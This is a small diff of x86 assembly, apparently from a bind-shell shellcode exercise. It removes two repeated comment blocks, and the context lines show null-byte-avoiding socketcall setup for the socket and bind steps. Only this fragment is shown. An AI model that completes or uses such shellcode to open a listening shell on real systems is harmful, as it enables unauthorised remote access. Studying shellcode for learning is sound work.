@@ -17,9 +17,6 @@ xor ebx, ebx
 xor edx, edx
 xor edi, edi
 
-
-;;#define __NR_socketcall 102 
-;;int socketcall(int call, unsigned long *args);
 mov al, 0x66     ; call SocketCall() in order to use the SYS_SOCKET argument
 mov bl, 0x1      ; define the SYS_SOCKET value to be 0x1. The value can be stored at bl in order to avoid null values
 
@@ -34,9 +31,6 @@ mov edi, eax     ; EAX will store the return value of the socket
                  ; descriptor. the sockfd will be needed to other 
                  ; syscalls so it will be saved at EDI register.  
                  ; Also we will need the EAX register to use with other syscalls
-
-;;#define __NR_socketcall 102 
-;;int socketcall(int call, unsigned long *args);
 
 mov al, 0x66     ; call SocketCall() in order to use the SYS_BIND argument
 inc bl           ; increase the ebx from 0x1 to 0x2 which indicates the bind() syscall 
